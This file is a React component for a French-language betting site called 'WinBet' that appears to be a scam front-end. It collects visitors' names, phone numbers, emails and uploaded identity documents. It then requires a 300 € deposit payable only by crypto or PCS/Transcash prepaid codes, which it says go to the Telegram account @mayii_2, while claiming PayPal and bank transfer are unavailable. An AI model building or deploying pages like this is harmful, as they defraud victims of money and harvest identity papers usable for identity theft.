# winbet-demo.
import React, { useState } from "react";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";

export default function BettingSiteDemo() {
  const [step, setStep] = useState("landing");
  const [form, setForm] = useState({ nom: "", prenom: "", phone: "", email: "" });
  const handleChange = (e) => setForm({ ...form, [e.target.name]: e.target.value });

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 to-gray-800 text-white flex flex-col items-center justify-center p-6">
      {step === "landing" && (
        <Card className="w-full max-w-md text-center">
          <CardContent className="space-y-4">
            <h1 className="text-3xl font-bold">Bienvenue sur WinBet</h1>
            <p>Rejoins la plateforme de paris la plus rapide et sécurisée</p>
            <Button onClick={() => setStep("register")} className="w-full">Commencer maintenant</Button>
          </CardContent>
        </Card>
      )}

      {step === "register" && (
        <Card className="w-full max-w-md">
          <CardContent className="space-y-4">
            <h2 className="text-xl font-semibold text-center">Inscription</h2>
            <Input name="nom" placeholder="Nom" onChange={handleChange} />
            <Input name="prenom" placeholder="Prénom" onChange={handleChange} />
            <Input name="phone" placeholder="Téléphone" onChange={handleChange} />
            <Input name="email" placeholder="Email" onChange={handleChange} />
            <Button onClick={() => setStep("verification")} className="w-full">Valider</Button>
          </CardContent>
        </Card>
      )}

      {step === "verification" && (
        <Card className="w-full max-w-md">
          <CardContent className="space-y-4 text-center">
            <h2 className="text-xl font-semibold">Vérification d'identité</h2>
            <p>Merci d’envoyer un document valide : Passeport, CNI, Permis, ou Carte de séjour.</p>
            <Input type="file" className="w-full" />
            <p className="text-sm">📩 Les documents seront envoyés à notre équipe par email professionnel.</p>
            <Button onClick={() => setStep("rechargement")} className="w-full">Envoyer</Button>
          </CardContent>
        </Card>
      )}

      {step === "rechargement" && (
        <Card className="w-full max-w-md">
          <CardContent className="space-y-4 text-center">
            <h2 className="text-xl font-semibold">Rechargement requis</h2>
            <p>Un premier rechargement de <strong>300 € minimum</strong> est requis pour continuer.</p>
            <Tabs defaultValue="crypto" className="w-full">
              <TabsList className="grid grid-cols-3">
                <TabsTrigger value="crypto">Crypto</TabsTrigger>
                <TabsTrigger value="carte">Cartes</TabsTrigger>
                <TabsTrigger value="autres">Autres</TabsTrigger>
              </TabsList>
              <TabsContent value="crypto">
                <p>Adresse crypto (BTC, USDT TRC20, BEP20)...</p>
              </TabsContent>
              <TabsContent value="carte">
                <Input placeholder="Code PCS / Transcash" className="w-full" />
                <p className="text-sm mt-2">📲 Le code sera automatiquement transmis à notre Telegram : <strong>@mayii_2</strong></p>
              </TabsContent>
              <TabsContent value="autres">
                <p className="text-red-500">❌ PayPal & Virement temporairement indisponibles. Choisissez un autre moyen.</p>
              </TabsContent>
            </Tabs>
          </CardContent>
        </Card>
      )}
    </div>
  );
}

